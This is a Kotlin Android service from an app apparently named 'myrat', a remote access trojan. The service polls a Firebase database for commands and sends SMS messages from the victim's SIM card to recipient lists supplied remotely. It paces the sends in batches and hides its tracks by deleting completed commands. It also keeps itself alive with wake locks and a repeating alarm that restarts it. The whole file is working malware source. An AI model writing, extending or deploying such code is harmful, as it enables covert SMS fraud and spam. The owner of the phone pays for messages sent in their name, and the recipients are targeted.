package com.myrat.app.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.*
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger

class SmsService : Service() {
    companion object {
        private const val CHANNEL_ID = "SmsServiceChannel"
        private const val NOTIFICATION_ID = 1
    }

    private val sentSmsTracker = mutableMapOf<String, MutableSet<String>>()
    private lateinit var deviceId: String
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        try {
            // Acquire wake lock to ensure SMS works even when screen is off
            acquireWakeLock()
            
            deviceId = MainActivity.getDeviceId(this)
            createNotificationChannel()
            val notification = buildForegroundNotification()
            startForeground(NOTIFICATION_ID, notification)
            scheduleRestart(this)
            Logger.log("SmsService created successfully for device: $deviceId")
        } catch (e: Exception) {
            Logger.error("Failed to create SmsService", e)
            stopSelf()
        }
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "SmsService:KeepAlive"
            )
            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
            Logger.log("Wake lock acquired for SmsService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake lock for SMS", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            listenForSendCommands(deviceId)
            return START_STICKY
        } catch (e: Exception) {
            Logger.error("Failed to start SmsService command", e)
            return START_NOT_STICKY
        }
    }

    private fun scheduleRestart(context: Context) {
        try {
            val alarmIntent = Intent(context, SmsService::class.java)
            val pendingIntent = PendingIntent.getService(
                context, 0, alarmIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            alarmManager.setRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 60_000,
                5 * 60_000,
                pendingIntent
            )
        } catch (e: Exception) {
            Logger.error("Failed to schedule SMS service restart", e)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "SMS Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Running SMS capture and send service"
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                notificationManager.createNotificationChannel(channel)
            } catch (e: Exception) {
                Logger.error("Failed to create SMS notification channel", e)
            }
        }
    }

    private fun buildForegroundNotification(): Notification {
        return try {
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SMS Service")
                .setContentText("Monitoring SMS commands")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to build SMS notification", e)
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SMS Service")
                .setContentText("Running")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        }
    }

    private fun listenForSendCommands(deviceId: String) {
        try {
            val commandsRef = Firebase.database.getReference("Device").child(deviceId).child("send_sms_commands")

            commandsRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { commandSnapshot ->
                            val command = commandSnapshot.value as? Map<*, *> ?: return@forEach
                            val status = command["status"] as? String
                            val commandId = commandSnapshot.key ?: return@forEach
                            
                            if (status == "pending") {
                                val simNumber = command["sim_number"] as? String
                                val recipients = command["recipients"] as? List<*>
                                val message = command["message"] as? String
                                
                                if (simNumber != null && recipients != null && message != null) {
                                    val validRecipients = recipients.filterIsInstance<String>().filter { it.isNotBlank() }
                                    if (validRecipients.isNotEmpty()) {
                                        Logger.log("Processing SMS command: $commandId for ${validRecipients.size} recipients using $simNumber")
                                        sendSmsToAll(simNumber, validRecipients, message, commandId)
                                    } else {
                                        Logger.error("No valid recipients for command: $commandId")
                                        updateCommandStatus(commandId, "failed", "No valid recipients")
                                    }
                                } else {
                                    Logger.error("Invalid command data for: $commandId")
                                    updateCommandStatus(commandId, "failed", "Invalid command data")
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing SMS commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("SMS commands database error: ${error.message}", error.toException())
                }
            })
        } catch (e: Exception) {
            Logger.error("Failed to listen for SMS commands", e)
        }
    }

    private fun sendSmsToAll(simNumber: String, recipients: List<String>, message: String, commandId: String) {
        try {
            val handler = Handler(Looper.getMainLooper())
            val commandRef = Firebase.database.getReference("Device/$deviceId/send_sms_commands/$commandId")
            
            // Get appropriate SMS manager for the specified SIM
            val smsManager = getSmsManagerForSim(simNumber)
            if (smsManager == null) {
                Logger.error("Failed to get SMS manager for SIM: $simNumber")
                updateCommandStatus(commandId, "failed", "Invalid SIM number: $simNumber")
                return
            }

            val chunks = recipients.chunked(10)
            val alreadySentSet = sentSmsTracker.getOrPut(commandId) { mutableSetOf() }

            fun sendChunk(index: Int) {
                if (index >= chunks.size) {
                    Logger.log("Completed sending SMS for command: $commandId")
                    updateCommandStatus(commandId, "completed", null)
                    return
                }

                val batch = chunks[index]
                var successCount = 0
                var failureCount = 0

                batch.forEach { number ->
                    if (alreadySentSet.contains(number)) {
                        Logger.log("Skipping duplicate SMS to $number for command $commandId")
                        return@forEach
                    }

                    try {
                        // Ensure we can send SMS even when screen is off
                        val parts = smsManager.divideMessage(message)
                        if (parts.size == 1) {
                            smsManager.sendTextMessage(number, null, message, null, null)
                        } else {
                            smsManager.sendMultipartTextMessage(number, null, parts, null, null)
                        }
                        
                        Logger.log("Sent SMS from $simNumber to $number")
                        alreadySentSet.add(number)
                        successCount++

                        // Remove number from recipients list in Firebase
                        commandRef.child("recipients").runTransaction(object : Transaction.Handler {
                            override fun doTransaction(currentData: MutableData): Transaction.Result {
                                val currentList = currentData.getValue(object : GenericTypeIndicator<MutableList<String>>() {}) ?: mutableListOf()
                                currentList.remove(number)
                                currentData.value = currentList
                                return Transaction.success(currentData)
                            }

                            override fun onComplete(error: DatabaseError?, committed: Boolean, snapshot: DataSnapshot?) {
                                if (committed) {
                                    val newList = snapshot?.getValue(object : GenericTypeIndicator<List<String>>() {})
                                    if (newList == null || newList.isEmpty()) {
                                        commandRef.removeValue()
                                            .addOnSuccessListener { 
                                                Logger.log("Removed completed command $commandId")
                                                sentSmsTracker.remove(commandId)
                                            }
                                            .addOnFailureListener { e -> 
                                                Logger.error("Failed to remove command: ${e.message}", e) 
                                            }
                                    }
                                }
                            }
                        })
                    } catch (e: Exception) {
                        Logger.error("Failed to send SMS to $number: ${e.message}", e)
                        failureCount++
                    }
                }

                Logger.log("Batch $index completed: $successCount success, $failureCount failures")

                // Schedule next batch with delay
                if (index + 1 < chunks.size) {
                    handler.postDelayed({ sendChunk(index + 1) }, 60_000L) // 1 min delay
                }
            }

            sendChunk(0)
        } catch (e: Exception) {
            Logger.error("Failed to send SMS batch for command: $commandId", e)
            updateCommandStatus(commandId, "failed", "Batch send error: ${e.message}")
        }
    }

    private fun getSmsManagerForSim(simNumber: String): SmsManager? {
        return try {
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subscriptions = subscriptionManager.activeSubscriptionInfoList ?: return null
            
            // Find subscription by SIM number or slot (sim1, sim2)
            val subscription = subscriptions.find { 
                it.number == simNumber || 
                "sim${it.simSlotIndex + 1}" == simNumber.lowercase() ||
                it.displayName.toString().lowercase().contains(simNumber.lowercase())
            }
            
            if (subscription != null) {
                Logger.log("Found subscription for $simNumber: slot ${subscription.simSlotIndex}, subId ${subscription.subscriptionId}")
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    SmsManager.getSmsManagerForSubscriptionId(subscription.subscriptionId)
                } else {
                    SmsManager.getDefault()
                }
            } else {
                Logger.error("No subscription found for SIM: $simNumber, using default")
                SmsManager.getDefault()
            }
        } catch (e: Exception) {
            Logger.error("Error getting SMS manager for SIM: $simNumber", e)
            SmsManager.getDefault()
        }
    }

    private fun updateCommandStatus(commandId: String, status: String, error: String?) {
        try {
            val commandRef = Firebase.database.getReference("Device/$deviceId/send_sms_commands/$commandId")
            val updates = mutableMapOf<String, Any>(
                "status" to status,
                "timestamp" to System.currentTimeMillis()
            )
            if (error != null) {
                updates["error"] = error
            }
            
            commandRef.updateChildren(updates)
                .addOnSuccessListener {
                    Logger.log("Updated SMS command $commandId status to $status")
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to update SMS command status: ${e.message}", e)
                }
        } catch (e: Exception) {
            Logger.error("Error updating SMS command status", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            // Release wake lock
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            Logger.log("SmsService destroyed")
        } catch (e: Exception) {
            Logger.error("Error destroying SmsService", e)
        }
    }
}